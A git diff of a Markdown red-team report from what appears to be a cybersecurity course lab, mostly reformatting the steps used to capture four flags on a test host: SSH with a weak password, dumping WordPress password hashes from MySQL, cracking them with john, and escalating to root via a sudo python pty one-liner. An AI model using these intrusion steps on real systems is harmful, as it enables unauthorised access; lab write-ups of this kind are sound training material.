@@ -45,6 +45,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 - Target 1
   - `flag1.txt`: b9bbcb33e11b80be759c4e844862482d
    - **Exploit Used**
+   
     - ssh into Michael's account and look through files in /var/www
     - Command: ssh michael@192.168.1.110
     - The username and password for Michael's account is identical: michael
@@ -62,10 +63,10 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
   - `flag2.txt`: fc3fd58dcdad9ab23faca6e9a36e581c
    - **Exploit Used**
-    - Command: ssh michael@192.168.1.110 
-    - The username and password for Michael's account is identical: michael
-    - Command: locate *flag*
-    - Command: cat /var/www/flag2.txt
+     - Command: ssh michael@192.168.1.110 
+     - The username and password for Michael's account is identical: michael
+     - Command: locate *flag*
+     - Command: cat /var/www/flag2.txt
   
   
   ![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/locate%20*flag*.png)
@@ -76,8 +77,8 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
   - `flag3.txt`: afc01ab56b50591e7dccf93122770cd2
    - **Exploit Used**
-    - Continued using michael shell to find the MySQL database password, logged into MySQL database, and found Flag 3 in wp_posts table.
-    - Command: ls /var/www/html/wordpress/
+     - Continued using michael shell to find the MySQL database password, logged into MySQL database, and found Flag 3 in wp_posts table.
+     - Command: ls /var/www/html/wordpress/
   
   
   ![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/ls%20wordpress:.png)
@@ -112,19 +113,22 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
   ![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/show%20db%20and%20Use%20wordpress.png)
   
 <br>
-    - Command: show tables;
+
+   - Command: show tables;
   
   
   ![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/show%20tables%3B.png)
   
 <br>
-    - Command: SELECT * FROM wp_posts;	
+
+   - Command: SELECT * FROM wp_posts;	
   
   
   ![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/SELECT%20*%20FROM%20wp_posts%201.png)
   ![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/SELECT%20*%20FROM%20wp_posts%202.png)
 
 <br>
+
    - Screenshot of Wordpress user password hashes:
     - Command: SELECT * FROM wp_users;
   
@@ -133,17 +137,19 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
 
 <br>
+
   - `flag4.txt`: 715dea6c055b9fe3337544932f2941ce
    - **Exploit Used**
-    - Used john to crack the password hash obtained from MySQL database, secured a new user shell as Steven, escalated to root.
-    - Cracking the hashed password using john.
-    - Copied password hash from MySQL into ~/root/wp_hashes.txt and cracked with john to discover Steven’s password: pink84.
-    - Command: john --show wp_hashes.txt
+     - Used john to crack the password hash obtained from MySQL database, secured a new user shell as Steven, escalated to root.
+     - Cracking the hashed password using john.
+     - Copied password hash from MySQL into ~/root/wp_hashes.txt and cracked with john to discover Steven’s password: pink84.
+     - Command: john --show wp_hashes.txt
 
 
 ![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/john%20command.png)
 
 <br>
+
    - Secure a user shell as the user whose password you cracked.
     - Command: ssh steven@192.168.1.110
     - Password: pink84
@@ -154,11 +160,14 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
  ![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/sudo%20-l.png)
 
 <br>
-    - Command: sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’
+   
+   - Command: sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’
   
   
   ![ScreenShot](https://github.com/Jonathan-K88/Cybersecurity-Final-Project/blob/main/Images/sudo%20python%20-c%20'import%20pty%3Bpty.spawn(%22:bin:bash%22)'.png)
+
 <br>
+
    - Search for the root directory for Flag 4.
     - Command: cd /root/
     - Command: ls
